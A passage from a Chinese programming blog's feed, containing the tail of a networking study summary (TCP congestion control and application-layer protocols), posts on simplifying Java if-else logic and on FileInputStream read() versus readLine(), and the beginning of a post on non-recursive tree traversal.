使用滑动窗口机制。发送窗口里面的序号表示允许发送的序号。发送窗口后沿的后面部分表示已发送且已收到确认，而发送窗口前沿的前面部分表示不允许发送。发送窗口后沿的变化情况有两种可能，即不动（没有收到新的确认）和前移（收到了新的确认）。发送窗口的前沿通常是不断向前移动的。一般来说，我们总是希望数据传输更快一些。但如果发送方把数据发送的过快，接收方就可能来不及接收，这就会造成数据的丢失。所谓流量控制就是让发送方的发送速率不要太快，要让接收方来得及接收。</strong></li><li>在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种情况就叫拥塞。拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收。</li><li><strong>为了进行拥塞控制，TCP 发送方要维持一个拥塞窗口 cwnd 的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。</strong></li><li><strong>TCP 的拥塞控制采用了四种算法，即慢开始，拥塞避免，快重传和快恢复。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理 AQM），以减少网络拥塞的发生。</strong></li><li>运输连接的三个阶段，即：连接建立，数据传送和连接释放。</li><li><strong>主动发起 TCP 连接建立的应用进程叫做客户，而被动等待连接建立的应用进程叫做服务器。TCP 连接采用三报文握手机制。服务器要确认用户的连接请求，然后客户要对服务器的确认进行确认。</strong></li><li>TCP 的连接释放采用四报文握手机制。任何一方都可以在数据传送结束后发出连接释放的通知，待对方确认后进入半关闭状态。当另一方也没有数据再发送时，则发送连接释放通知，对方确认后就完全关闭了 TCP 连接</li></ol><h3 id="5-3-补充（重要）"><a href="#5-3-补充（重要）" class="headerlink" title="5.3. 补充（重要）"></a>5.3. 补充（重要）</h3><p>以下知识点需要重点关注：</p><ol><li>端口和套接字的意义</li><li>UDP 和 TCP 的区别以及两者的应用场景</li><li>在不可靠的网络上实现可靠传输的工作原理，停止等待协议和 ARQ 协议</li><li>TCP 的滑动窗口，流量控制，拥塞控制和连接管理</li><li>TCP 的三次握手，四次挥手机制</li></ol><h2 id="6-应用层（Application-Layer）"><a href="#6-应用层（Application-Layer）" class="headerlink" title="6. 应用层（Application Layer）"></a>6. 应用层（Application Layer）</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40Ke33HT18JEZTyPFrStiaMHdWs7a7T07CIbdLryJoCJMZ5f83Ltug9Mlw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="应用层"></p><h3 id="6-1-基本术语"><a href="#6-1-基本术语" class="headerlink" title="6.1. 基本术语"></a>6.1. 基本术语</h3><ol><li><strong>域名系统（DNS）</strong> ：域名系统（DNS，Domain Name System）将人类可读的域名 (例如，<a href="http://www.baidu.com/">www.baidu.com</a>) 转换为机器可读的 IP 地址 (例如，220.181.38.148)。我们可以将其理解为专为互联网设计的电话薄。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KGmT3bbwRxUcDUnW3FGTuJyDFJeQoztiaqdafsrxVr6QmmcU6UnngIEA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p><a href="https://www.seobility.net/en/wiki/HTTP_headers">https://www.seobility.net/en/wiki/HTTP_headers</a></p><ol><li><strong>文件传输协议（FTP）</strong> ：FTP 是 File TransferProtocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于 Internet 上的控制文件的双向传输。同时，它也是一个应用程序（Application）。基于不同的操作系统有不同的 FTP 应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在 FTP 的使用当中，用户经常遇到两个概念：”下载”（Download）和”上传”（Upload）。”下载”文件就是从远程主机拷贝文件至自己的计算机上；”上传”文件就是将文件从自己的计算机中拷贝至远程主机上。用 Internet 语言来说，用户可通过客户机程序向（从）远程主机上传（下载）文件。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KoyZl04PDhEBgdCSWUVej9SCYvnJEufWlZBIwOAtm5Jlzs54ficyU5WA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="FTP工作过程"></p><ol><li><strong>简单文件传输协议（TFTP）</strong> ：TFTP（Trivial File Transfer Protocol,简单文件传输协议）是 TCP/IP 协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。端口号为 69。</li><li><strong>远程终端协议（TELENET）</strong> ：Telnet 协议是 TCP/IP 协议族中的一员，是 Internet 远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用 telnet 程序，用它连接到服务器。终端使用者可以在 telnet 程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个 telnet 会话，必须输入用户名和密码来登录服务器。Telnet 是常用的远程控制 Web 服务器的方法。</li><li><strong>万维网（WWW）</strong> ：WWW 是环球信息网的缩写，（亦作“Web”、“WWW”、“’W3’”，英文全称为“World Wide Web”），中文名字为“万维网”，”环球网”等，常简称为 Web。分为 Web 客户端和 Web 服务器程序。WWW 可以让 Web 客户端（常用浏览器）访问浏览 Web 服务器上的页面。是一个由许多互相链接的超文本组成的系统，通过互联网访问。在这个系统中，每个有用的事物，称为一样“资源”；并且由一个全局“统一资源标识符”（URI）标识；这些资源通过超文本传输协议（Hypertext Transfer Protocol）传送给用户，而后者通过点击链接来获得资源。万维网联盟（英语：World Wide Web Consortium，简称 W3C），又称 W3C 理事会。1994 年 10 月在麻省理工学院（MIT）计算机科学实验室成立。万维网联盟的创建者是万维网的发明者蒂姆·伯纳斯-李。万维网并不等同互联网，万维网只是互联网所能提供的服务其中之一，是靠着互联网运行的一项服务。</li><li><strong>万维网的大致工作工程：</strong></li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KtdIowP6M0tWZhaRlF8icddPztoaDnXhGDJXP0Q13e3lG0wmepfU7AQQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="万维网的大致工作工程"></p><ol><li><strong>统一资源定位符（URL）</strong> ：统一资源定位符是对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的 URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。</li><li><strong>超文本传输协议（HTTP）</strong> ：超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的 WWW 文件都必须遵守这个标准。设计 HTTP 最初的目的是为了提供一种发布和接收 HTML 页面的方法。1960 年美国人 Ted Nelson 构思了一种通过计算机处理文本信息的方法，并称之为超文本（hypertext）,这成为了 HTTP 超文本传输协议标准架构的发展根基。</li></ol><p>HTTP 协议的本质就是一种浏览器与服务器之间约定好的通信格式。HTTP 的原理如下图所示：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/iaIdQfEric9Txpk4narOnyI7xL1Im2X40K5y5tH02HtyI4D0icvNjlcoH9qxOiaMibjdgkVu8YB6ZXl7BoslFic7l5sQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><ol><li><strong>代理服务器（Proxy Server）</strong> ：代理服务器（Proxy Server）是一种网络实体，它又称为万维网高速缓存。代理服务器把最近的一些请求和响应暂存在本地磁盘中。当新请求到达时，若代理服务器发现这个请求与暂时存放的的请求相同，就返回暂存的响应，而不需要按 URL 的地址再次去互联网访问该资源。代理服务器可在客户端或服务器工作，也可以在中间系统工作。</li><li><strong>简单邮件传输协议(SMTP)</strong> : SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议,它是一组用于由源地址到目的地址传送邮件的规则，由它来控制信件的中转方式。SMTP 协议属于 TCP/IP 协议簇，它帮助每台计算机在发送或中转信件时找到下一个目的地。通过 SMTP 协议所指定的服务器,就可以把 E-mail 寄到收信人的服务器上了，整个过程只要几分钟。SMTP 服务器则是遵循 SMTP 协议的发送邮件服务器，用来发送或中转发出的电子邮件。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KibGIaIUian9kArCrxV65TBdbWeY7w3rgtlroia7KhtRbic3e8GlyYsZHbg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="一个电子邮件被发送的过程"></p><p><a href="https://www.campaignmonitor.com/resources/knowledge-base/what-is-the-code-that-makes-bcc-or-cc-operate-in-an-email/">https://www.campaignmonitor.com/resources/knowledge-base/what-is-the-code-that-makes-bcc-or-cc-operate-in-an-email/</a></p><ol><li><strong>搜索引擎</strong> :搜索引擎（Search Engine）是指根据一定的策略、运用特定的计算机程序从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务，将用户检索相关的信息展示给用户的系统。搜索引擎包括全文索引、目录索引、元搜索引擎、垂直搜索引擎、集合式搜索引擎、门户搜索引擎与免费链接列表等。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KAdo3NwVkz5KOWB2Pht1bVO74ltib8C29xqHiabCYJiaUIJehjLsVI4r9w/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="搜索引擎"></p><ol><li><strong>垂直搜索引擎</strong> ：垂直搜索引擎是针对某一个行业的专业搜索引擎，是搜索引擎的细分和延伸，是对网页库中的某类专门的信息进行一次整合，定向分字段抽取出需要的数据进行处理后再以某种形式返回给用户。垂直搜索是相对通用搜索引擎的信息量大、查询不准确、深度不够等提出来的新的搜索引擎服务模式，通过针对某一特定领域、某一特定人群或某一特定需求提供的有一定价值的信息和相关服务。其特点就是“专、精、深”，且具有行业色彩，相比较通用搜索引擎的海量信息无序化，垂直搜索引擎则显得更加专注、具体和深入。</li><li><strong>全文索引</strong> :全文索引技术是目前搜索引擎的关键技术。试想在 1M 大小的文件中搜索一个词，可能需要几秒，在 100M 的文件中可能需要几十秒，如果在更大的文件中搜索那么就需要更大的系统开销，这样的开销是不现实的。所以在这样的矛盾下出现了全文索引技术，有时候有人叫倒排文档技术。</li><li><strong>目录索引</strong> ：目录索引（ search index/directory)，顾名思义就是将网站分门别类地存放在相应的目录中，因此用户在查询信息时，可选择关键词搜索，也可按分类目录逐层查找。</li></ol><h3 id="6-2-重要知识点总结"><a href="#6-2-重要知识点总结" class="headerlink" title="6.2. 重要知识点总结"></a>6.2. 重要知识点总结</h3><ol><li>文件传输协议（FTP）使用 TCP 可靠的运输服务。FTP 使用客户服务器方式。一个 FTP 服务器进程可以同时为多个用户提供服务。在进进行文件传输时，FTP 的客户和服务器之间要先建立两个并行的 TCP 连接:控制连接和数据连接。实际用于传输文件的是数据连接。</li><li>万维网客户程序与服务器之间进行交互使用的协议是超文本传输协议 HTTP。HTTP 使用 TCP 连接进行可靠传输。但 HTTP 本身是无连接、无状态的。HTTP/1.1 协议使用了持续连接（分为非流水线方式和流水线方式）</li><li>电子邮件把邮件发送到收件人使用的邮件服务器，并放在其中的收件人邮箱中，收件人可随时上网到自己使用的邮件服务器读取，相当于电子邮箱。</li><li>一个电子邮件系统有三个重要组成构件：用户代理、邮件服务器、邮件协议（包括邮件发送协议，如 SMTP，和邮件读取协议，如 POP3 和 IMAP）。用户代理和邮件服务器都要运行这些协议。</li></ol><h3 id="6-3-补充（重要）"><a href="#6-3-补充（重要）" class="headerlink" title="6.3. 补充（重要）"></a>6.3. 补充（重要）</h3><p>以下知识点需要重点关注：</p><ol><li>应用层的常见协议（重点关注 HTTP 协议）</li><li>域名系统-从域名解析出 IP 地址</li><li>访问一个网站大致的过程</li><li>系统调用和应用编程接口概念</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;转自公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/6ju4j_ffLuOBuoO53ZhcOA&quot;&gt;JavaGuide:大二逃课总结1.2w字的计算机网络知识&lt;/a&gt; 。供之后复习用。&lt;/p&gt;</summary>
    
    
    
    <category term="网络" scheme="https://www.fvolcano.red/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>if-else的优化</title>
    <link href="https://www.fvolcano.red/2020/ultimazation-of-ifelse/"/>
    <id>https://www.fvolcano.red/2020/ultimazation-of-ifelse/</id>
    <published>2020-11-05T12:27:43.000Z</published>
    <updated>2020-11-05T12:27:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>针对 if-else 的各种不同优化方案。<a id="more"></a></p><h1 id="消灭if-else嵌套"><a href="#消灭if-else嵌套" class="headerlink" title="消灭if-else嵌套"></a>消灭if-else嵌套</h1><p><a href="https://juejin.im/post/6844904080104488967">参考出处1</a>：使用设计模式中的<strong>策略模式</strong>来优化针对不同条件进行不同操作的需求。</p><p><a href="https://blog.csdn.net/fzy629442466/article/details/85762748">参考出处2</a>：优化大量的if else 的不同方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                        ...</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>if-else</code>一般不建议嵌套超过三层，如果一段代码存在过多的<code>if-else</code>嵌套，代码的可读性就会急速下降，后期维护难度也大大提高。</p><h1 id="多条件判断时的if-else选择与排序"><a href="#多条件判断时的if-else选择与排序" class="headerlink" title="多条件判断时的if-else选择与排序"></a>多条件判断时的if-else选择与排序</h1><p><a href="https://www.cnblogs.com/rwg-xs/articles/6213168.html">参考出处</a></p><h2 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h2><h3 id="if-else-语句块的顺序"><a href="#if-else-语句块的顺序" class="headerlink" title="if/else 语句块的顺序"></a>if/else 语句块的顺序</h3><ul><li>首先处理正逻辑而不是负逻辑</li><li>先处理简单的情况</li><li>先处理有趣的或者是可疑的情况</li></ul><h3 id="通过提早返回减少嵌套"><a href="#通过提早返回减少嵌套" class="headerlink" title="通过提早返回减少嵌套"></a>通过提早返回减少嵌套</h3><h3 id="总结变量"><a href="#总结变量" class="headerlink" title="总结变量"></a>总结变量</h3><ul><li>用一个短很多的名字来代替一大块代码，这就是总结变量。</li><li>使用德摩根定理,分解复制的判断逻辑</li><li>拆分巨大的语句，让语句更容易快速阅读</li></ul><h3 id="分析函数（或代码块）画出逻辑树"><a href="#分析函数（或代码块）画出逻辑树" class="headerlink" title="分析函数（或代码块）画出逻辑树"></a>分析函数（或代码块）画出逻辑树</h3><p>逻辑树是为了理清复杂if语句逻辑二产生的，结构与哈夫曼树类似：</p><p><img src="/2020/ultimazation-of-ifelse/1013328-20161222224548995-776032877.png"> </p><p>逻辑树规则：（模块的定义：每一个if/else的分支即为一个模块）</p><p>1.每个模块都是一个根结点，每一个根结点都会结束函数运行。</p><p>2.同等级的模块（即if语句的正反两面），无子模块的模块（内部无if语句）优先级高于拥有子模块的模块（内部嵌套if语句）</p><p>3.同等级和同条件（两个模块都拥有子模块或者都没有子模块）的情况下，使用率高的模块优先级高于使用率低的</p><p>4.若模块中包含子模块，子模块的优先级高于父模块。</p><p><strong>例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="keyword">if</span>(user_result == SUCCESS )&#123;</span><br><span class="line">    <span class="comment">// 2</span></span><br><span class="line">　　<span class="keyword">if</span>( permission_result != SUCCESS)&#123;</span><br><span class="line">      <span class="comment">// 3</span></span><br><span class="line">　　　　reply.WriteErrors(<span class="string">&quot;error reading permissions&quot;</span>);</span><br><span class="line">　　　　reply.Done();</span><br><span class="line">　　　　<span class="keyword">return</span>;</span><br><span class="line">   <span class="comment">// 2   </span></span><br><span class="line">　　&#125;</span><br><span class="line">　　reply.WriteErrors(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">// 1    </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 4</span></span><br><span class="line">　　reply.WriteErrors(user_result);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 共有</span></span><br><span class="line">reply.Done();</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>根据原则优化：</p><ol><li><p>2、4两个属于同等级模块，但是由于红色模块中包含一个子模块，所以红色模块优先级低于紫色模块</p></li><li><p>3模块属于2模块子模块，所以3模块优先级高于2模块</p></li><li><p>函数的优先级排列由高到低为：4  &gt; 3 &gt; 2</p></li></ol><p>得：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(user_result != SUCCESS)&#123;</span><br><span class="line">　　reply.WriteErrors(user_result);</span><br><span class="line">　　reply.Done();</span><br><span class="line">　　<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(permission_result != SUCCESS)&#123;</span><br><span class="line">　　reply.WriteErrors(permission_result);</span><br><span class="line">　　reply.Done();</span><br><span class="line">　　<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reply.WriteErrors(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">reply.Done();</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><h1 id="哈夫曼树在多重判定程序中的运用"><a href="#哈夫曼树在多重判定程序中的运用" class="headerlink" title="哈夫曼树在多重判定程序中的运用"></a>哈夫曼树在多重判定程序中的运用</h1><p><a href="https://www.docin.com/p-764063178.html">参考论文</a></p><p><img src="/2020/ultimazation-of-ifelse/%E5%93%88%E5%A4%AB%E6%9B%BC.png" alt="哈夫曼"></p><h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><h2 id="多个「或」等值判断"><a href="#多个「或」等值判断" class="headerlink" title="多个「或」等值判断"></a>多个「或」等值判断</h2><p><a href="https://www.toutiao.com/i6535677221640602125/">参考出处</a></p><p>reg.equals(“1”) || reg.equals(“2”) || reg.equals(“3”)||…省去n个</p><p>可以借助map或set来进行判断，因为hashmap是一个hash桶，查找的效率是比较快的，不管判断任何值，查询效率基本很稳定。</p><p>推荐指定hashmap的长度和需要判断的元素一样多，这样就避免对某一个桶内衍生出多余链表了。</p><p><img src="/2020/ultimazation-of-ifelse/1521705513450288676a8a8" alt="Java逻辑条件多个「或」判断时，性能优化小技巧，值得一试"></p><p><img src="/2020/ultimazation-of-ifelse/15217055457025d21af6336" alt="Java逻辑条件多个「或」判断时，性能优化小技巧，值得一试"></p><h2 id="提前判断返回"><a href="#提前判断返回" class="headerlink" title="提前判断返回"></a>提前判断返回</h2><p>如下语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition)&#123;</span><br><span class="line">   <span class="comment">//dost</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!condition)&#123;</span><br><span class="line">   <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//dost</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure><p>避免一些不必要的分支，让代码更精炼。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;针对 if-else 的各种不同优化方案。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>FileInputStream read()与readline()</title>
    <link href="https://www.fvolcano.red/2020/FileInputStream-read-and-readline/"/>
    <id>https://www.fvolcano.red/2020/FileInputStream-read-and-readline/</id>
    <published>2020-10-24T06:16:10.000Z</published>
    <updated>2020-10-24T06:16:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>FileInputStream中方法read()与readline()辨析。<a id="more"></a></p><h3 id="read-与-read-byte-b"><a href="#read-与-read-byte-b" class="headerlink" title="read() 与 read(byte[] b)"></a>read() 与 read(byte[] b)</h3><p>读取单个字符的个数，如果已经读完的话会返回-1 (其范围从 0 到 65535 )，这个方法是对这个流一个一个字节的读，返回的int就是这个字节的int表示方式。</p><p>参考<a href="https://blog.csdn.net/wymrdjm/article/details/78758986">FileInputStream之read方法</a></p><h2 id="readLine"><a href="#readLine" class="headerlink" title="readLine()"></a>readLine()</h2><p>读取一个文本行。</p><ol><li>读入的数据要注意有/r或/n或/r/n, readLine返回的字符串中不包含结尾的”\r”,”\n”。</li><li>没有数据时会阻塞，在数据流异常或断开时才会返回null。</li><li>使用socket之类的数据流时，要避免使用readLine()，以免为了等待一个换行/回车符而一直阻塞。</li><li>readLine()是一个阻塞函数，当没有数据读取时，就一直会阻塞在那，而不是返回null。</li><li>readLine()只有在数据流发生异常或者另一端被close()掉时，才会返回null值。</li><li>如果不指定buffer大小，则readLine()使用的buffer有8192个字符。在达到buffer大小之前，只有遇到”/r”、”/n”、”/r/n”才会返回。</li><li>该方法读取一行文本，当遇到换行符”\n”,回车符”\r”或者回车符后面紧跟着换行符时，该行结束并返回。没有数据时，将会一直处于等待状态。因此在进行网络连接时，应该避免使用该方法。</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;FileInputStream中方法read()与readline()辨析。&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://www.fvolcano.red/categories/Java/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>树的遍历非递归算法及应用</title>
    <link href="https://www.fvolcano.red/2020/tree-traverse/"/>
    <id>https://www.fvolcano.red/2020/tree-traverse/</id>
    <published>2020-10-16T00:40:24.000Z</published>
    <updated>2020-10-16T00:40:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>介绍树的三种非递归遍历代码的Java实现及应用。<a id="more"></a></p><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>创建内部接口 Visitor ，通过传入方法来实现对遍历元素的定制操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Visitor</span>&lt;<span class="title">E</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> stop = <span class="keyword">false</span>; <span class="comment">// 标记停止位置，设置为true代表停止遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">visit</span><span class="params">(TreeNode&lt;E&gt; node)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Visitor visitor = (node) -&gt; &#123;  <span class="comment">// 默认visitor，若没有传入则使用</span></span><br><span class="line">    System.out.print(node.element + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BinaryTree&lt;Integer&gt; tree = <span class="keyword">new</span> BinaryTree&lt;&gt;();</span><br><span class="line">tree.preorder((node) -&gt; &#123;  </span><br><span class="line">    <span class="keyword">if</span>(node.element == <span class="number">2</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    node.element ++;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h2><p>递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">preorder1</span><span class="params">(Visitor visitor)</span></span>&#123;  <span class="comment">//设置为private，在public方法中有对visitor为空的判断</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span> || visitor.stop) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    visitor.visit(root); <span class="comment">// 先对父节点进行操作</span></span><br><span class="line">    preorder1(root.left,visitor);</span><br><span class="line">    preorder1(root.right,visitor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">preorder2</span><span class="params">(Visitor visitor)</span> </span>&#123;</span><br><span class="line">    TreeNode&lt;E&gt; node = root;</span><br><span class="line">    Stack&lt;TreeNode&lt;E&gt;&gt; stack = <span class="keyword">new</span> LinkedStack&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    List&lt;TreeNode&lt;E&gt;&gt; visited = <span class="keyword">new</span> LinkedList&lt;TreeNode&lt;E&gt;&gt;(); <span class="comment">//记录访问过的节点</span></span><br><span class="line">    <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">    visitor.visit(node);</span><br><span class="line">    visited.add(node);</span><br><span class="line">    stack.push(node);</span><br><span class="line">    <span class="keyword">while</span>(visited.size() &lt; size) &#123;  <span class="comment">//size是tree的节点个数</span></span><br><span class="line">        <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 来到这里，node已经被访问了，有left就立即访问，放入栈中，成为下一次访问的父节点（返回处）</span></span><br><span class="line">        <span class="keyword">if</span>(node.left != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.left)) &#123;</span><br><span class="line">            visitor.visit(node.left);</span><br><span class="line">            visited.add(node.left);</span><br><span class="line">            stack.push(node.left);</span><br><span class="line">            node = node.left;</span><br><span class="line">        &#125; <span class="keyword">else</span> </span><br><span class="line">            <span class="comment">// 有right就立即访问，放入栈中，成为下一次访问的父节点（返回处）</span></span><br><span class="line">            <span 